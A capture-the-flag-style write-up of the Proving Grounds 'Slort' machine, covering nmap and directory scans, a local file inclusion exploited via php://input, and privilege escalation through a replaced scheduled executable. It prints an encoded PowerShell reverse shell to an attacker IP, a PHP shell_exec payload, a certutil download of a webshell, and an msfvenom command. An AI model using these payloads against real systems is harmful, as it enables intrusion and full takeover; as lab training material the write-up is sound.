#### Enumeration

Nmap

```
# Nmap 7.91 scan initiated Sat Nov  6 21:24:55 2021 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/AutoRecon/results/192.168.124.53/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/AutoRecon/results/192.168.124.53/scans/xml/_full_tcp_nmap.xml 192.168.124.53
adjust_timeouts2: packet supposedly had rtt of -309102 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -309102 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -596290 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -596290 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -588438 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -588438 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -2020515 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -2020515 microseconds.  Ignoring time.
Nmap scan report for 192.168.124.53
Host is up, received user-set (0.26s latency).
Scanned at 2021-11-06 21:24:56 EDT for 1058s
Not shown: 65520 filtered ports
Reason: 65520 no-responses
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
3306/tcp  open  mysql?        syn-ack ttl 127
| fingerprint-strings: 
|   NULL, ibm-db2, ibm-db2-das, oracle-tns: 
|_    Host '192.168.49.124' is not allowed to connect to this MariaDB server
| mysql-info: 
|_  MySQL Error: Host '192.168.49.124' is not allowed to connect to this MariaDB server
4443/tcp  open  http          syn-ack ttl 127 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.124.53:4443/dashboard/
5040/tcp  open  unknown       syn-ack ttl 127
7680/tcp  open  pando-pub?    syn-ack ttl 127
8080/tcp  open  http          syn-ack ttl 127 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.124.53:8080/dashboard/
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=9%D=11/6%Time=61872CB7%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.124'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(oracle-tn
SF:s,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.124'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(ibm-db2-da
SF:s,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.124'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(ibm-db2,4D
SF:,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.124'\x20is\x20not\x20allowed
SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|98 (88%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_98
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows XP SP3 (88%), Microsoft Windows 98 SE (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=11/6%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=61872F0A%P=x86_64-pc-linux-gnu)
SEQ(SP=105%GCD=1%ISR=10C%TS=U)
OPS(O1=M506NW8NNS%O2=M506NW8NNS%O3=M506NW8%O4=M506NW8NNS%O5=M506NW8NNS%O6=M506NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M506NW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 10286/tcp): CLEAN (Timeout)
|   Check 2 (port 26703/tcp): CLEAN (Timeout)
|   Check 3 (port 14132/udp): CLEAN (Timeout)
|   Check 4 (port 60986/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-11-07T01:41:57
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   270.27 ms 192.168.49.1
2   270.29 ms 192.168.124.53

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov  6 21:42:34 2021 -- 1 IP address (1 host up) scanned in 1060.77 seconds

```

The autorecon directory buster scan report for HTTP service on port 4443.

```
403       42l       97w        0c http://192.168.124.53:4443/.hta
403       42l       97w        0c http://192.168.124.53:4443/.hta.txt
403       42l       97w        0c http://192.168.124.53:4443/.hta.html
403       42l       97w        0c http://192.168.124.53:4443/.htaccess
...
403       45l      113w        0c http://192.168.124.53:4443/server-status
301        9l       30w      346c http://192.168.124.53:4443/site        # looks special
403       42l       97w        0c http://192.168.124.53:4443/webalizer

```

We browse the ```http://192.168.124.53:4443/site```, the page is automatically redirected to ```http://192.168.124.53:4443/site/index.php?page=main.php```.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Slort/Slort_2021.11.07_17h56m01s_001_.png)

Scan the site directory using feroxbuster, but no special results were found. Then I notice this re-directed URL. Could it have LFI or RFI vulnerability? 
Let's run a test. We Browse the url ```http://192.168.124.53:4443/site/index.php?page=/Windows/System32/drivers/etc/hosts``` and see the responses.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Slort/Slort_2021.11.07_18h23m47s_002_.png)

We can confirm the vulnerability exists. Now, try to get the shell using [PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php), but first we need to [generate](https://www.revshells.com/) reverse shell payload.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Slort/Slort_2021.11.07_20h44m47s_003_.png)

Open the Burp Suite and refresh page to send url. We modity url and body to send payload.

```
GET /site/index.php?page=php://input&cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADEAMgA0ACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA HTTP/1.1
Host: 192.168.124.53:4443
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=2vqr9cj4hp7d2uva04de1352ro
Upgrade-Insecure-Requests: 1
Content-Length: 41

<?php echo shell_exec($_GET['cmd']); ?>
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Slort/Slort_2021.11.07_20h55m37s_004_.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Slort/Slort_2021.11.07_20h58m29s_005_.png)

#### Privilege Escalation

I'm used to uploading [php webshell](https://github.com/k4mpr3t/b4tm4n/blob/master/bat.php) for easy browsing.

```
certutil -f -urlcache http://192.168.49.124/rev.php rev.php
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Slort/Slort_2021.11.07_21h29m30s_006_.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Slort/Slort_2021.11.07_21h31m03s_007_.png)

Find the backup folder at the root of C drive. According to ```info.txt``` file, TFTP.EXE is run every five minutes. We can replace the exe file to check whether it is true or not and check if the exe file is running as administrator.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Slort/Slort_2021.11.07_21h32m24s_008_.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Slort/Slort_2021.11.07_21h41m59s_009_.png)

[Generate](https://www.revshells.com/) reverse shell payload.

```
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADEAMgA0ACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA" -f exe > TFTP.EXE
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Slort/Slort_2021.11.07_21h51m55s_010_.png)

Upload the exe file via php webshell page. (If the exe file cannot be modified, try to revert machine.)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Slort/Slort_2021.11.07_21h52m05s_011_.png)

Wait for minutes and we get a shell as administrator luckily.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Slort/Slort_2021.11.07_21h56m26s_012_.png)
